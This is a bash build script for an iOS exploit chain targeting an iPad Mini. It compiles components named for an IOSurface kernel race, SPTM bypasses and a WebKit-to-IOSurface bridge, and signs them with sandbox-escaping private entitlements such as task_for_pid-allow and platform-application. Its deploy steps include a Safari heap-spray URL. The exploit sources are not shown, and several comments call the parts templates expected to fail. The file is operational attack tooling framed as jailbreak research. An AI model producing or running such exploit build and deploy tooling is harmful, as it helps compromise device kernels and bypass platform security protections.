#!/bin/bash
# Build all exploit chain PoCs for iPad Mini (iPad16,1) iOS 27.0.1
# Run on Mac with Xcode installed.
#
# Usage: ./build_all.sh
#
# Products land in ./build/
# Deploy to iPad via: pymobiledevice3 developer debugserver start ./build/<binary>
# Or via Xcode device runner.
#
# Educational jailbreak research only. For use on devices you own.

set -e

SDK=$(xcrun --sdk iphoneos --show-sdk-path 2>/dev/null || echo "")
CC="xcrun -sdk iphoneos clang"
ARCH="-arch arm64e"
MIN="-miphoneos-version-min=17.0"
SIGN="codesign -s - --entitlements /dev/stdin"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="$SCRIPT_DIR/build"
mkdir -p "$BUILD_DIR"

if [ -z "$SDK" ]; then
    echo "[-] iOS SDK not found. Install Xcode and run:"
    echo "    xcode-select --install"
    exit 1
fi

echo "=== Building Exploit Chain PoCs ==="
echo "SDK: $SDK"
echo "Output: $BUILD_DIR"
echo ""

# --- Step 4: IOSurface Race Condition (Kernel R/W) ---
echo "[*] Building iosurface_race..."
$CC $ARCH $MIN \
    -framework IOKit -framework IOSurface -framework CoreFoundation -lpthread \
    -o "$BUILD_DIR/iosurface_race" \
    "$SCRIPT_DIR/iosurface/iosurface_race.c" 2>&1 || {
    echo "[-] iosurface_race build failed (expected — needs IOSurface framework headers)"
    echo "    Will compile as standalone test on device"
}

# --- Step 6a: SPTM TLB Race (Primary SPTM Bypass) ---
echo "[*] Building sptm_tlb_race..."
$CC $ARCH $MIN \
    -framework IOKit -framework CoreFoundation -framework Metal -lpthread \
    -o "$BUILD_DIR/sptm_tlb_race" \
    "$SCRIPT_DIR/sptm/sptm_tlb_race.c" 2>&1 || {
    echo "[-] sptm_tlb_race build failed (expected — template needs kernel R/W linkage)"
}

# --- Step 6b: ptdesc Overflow (Backup SPTM Bypass) ---
echo "[*] Building ptdesc_overflow..."
$CC $ARCH $MIN \
    -lpthread \
    -o "$BUILD_DIR/ptdesc_overflow" \
    "$SCRIPT_DIR/sptm/ptdesc_overflow.c" 2>&1 || {
    echo "[-] ptdesc_overflow build failed"
}

# --- Step 6c: Coprocessor Bypass (Template) ---
echo "[*] Building coprocessor_bypass..."
$CC $ARCH $MIN \
    -framework IOKit -framework CoreFoundation -lpthread \
    -o "$BUILD_DIR/coprocessor_bypass" \
    "$SCRIPT_DIR/sptm/coprocessor_bypass.c" 2>&1 || {
    echo "[-] coprocessor_bypass build failed (expected — template)"
}

# --- Bridge: WebKit to IOSurface ---
echo "[*] Building webkit_to_iosurface..."
$CC $ARCH $MIN \
    -framework CoreFoundation -lpthread -ldl \
    -o "$BUILD_DIR/webkit_to_iosurface" \
    "$SCRIPT_DIR/iosurface/webkit_to_iosurface.c" 2>&1 || {
    echo "[-] webkit_to_iosurface build failed"
}

echo ""
echo "=== Build Summary ==="
ls -la "$BUILD_DIR/" 2>/dev/null | grep -v "^total"

echo ""
echo "=== Signing (ad-hoc for sideload) ==="
for binary in "$BUILD_DIR"/*; do
    if [ -f "$binary" ] && file "$binary" | grep -q "Mach-O"; then
        echo '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.private.security.no-sandbox</key>
    <true/>
    <key>task_for_pid-allow</key>
    <true/>
    <key>com.apple.system-task-ports</key>
    <true/>
    <key>platform-application</key>
    <true/>
</dict>
</plist>' | codesign -f -s - --entitlements /dev/stdin "$binary" 2>/dev/null && \
            echo "  [+] Signed: $(basename "$binary")" || \
            echo "  [-] Sign failed: $(basename "$binary")"
    fi
done

echo ""
echo "=== Deploy Instructions ==="
echo "1. Connect iPad Mini via USB"
echo "2. Enable Developer Mode on iPad (Settings > Privacy > Developer Mode)"
echo "3. Deploy with pymobiledevice3:"
echo "   pymobiledevice3 developer debugserver start $BUILD_DIR/ptdesc_overflow"
echo ""
echo "4. Or test via Safari heap spray:"
echo "   Navigate iPad to https://192.168.1.155:4447/groom/auto"
echo ""
echo "5. For IOSurface race (needs kernel R/W first):"
echo "   Deploy and run on iPad — will attempt race condition"
echo ""
echo "6. For SPTM TLB race (needs kernel R/W from IOSurface):"
echo "   Run after IOSurface exploit provides R/W primitives"
